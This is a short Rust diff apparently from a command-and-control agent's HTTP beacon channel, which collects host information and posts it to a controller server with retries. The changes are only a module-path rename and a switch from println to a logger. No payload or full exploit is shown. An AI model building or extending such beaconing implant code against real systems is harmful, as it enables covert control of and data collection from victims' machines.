@@ -4,7 +4,7 @@ use std::time::Duration;
 use crate::communication::message::{AgentMessage, ServerMessage};
 use crate::post::commands::AgentCommand;
 use crate::utils::logger::Logger;
-use crate::communication::comm::channel::CommChannel;
+use crate::communication::channels::channel::CommChannel;
 
 
 
@@ -20,7 +20,7 @@ impl CommChannel for HTTPCommChannel {
     ) -> (u64, String) {
         let address = format!("{}/beacon", self.address);
 
-        let beacon = match crate::communication::comm::channel::get_info(key).await {
+        let beacon = match crate::communication::channels::channel::get_info(key).await {
             Ok(beacon) => beacon,
             Err(e) => {
                 logger.error(&format!("[-] Failed to get host info: {:?}", e));
@@ -35,10 +35,11 @@ impl CommChannel for HTTPCommChannel {
             .unwrap();
     
         for attempt in 1..=self.retries {
-            println!(
+            logger.log(&format!(
                 "[*] Attempting HTTP beacon (attempt {}/{})",
                 attempt, self.retries
-            );
+            ));
+
     
             let res = client
                 .post(&address)
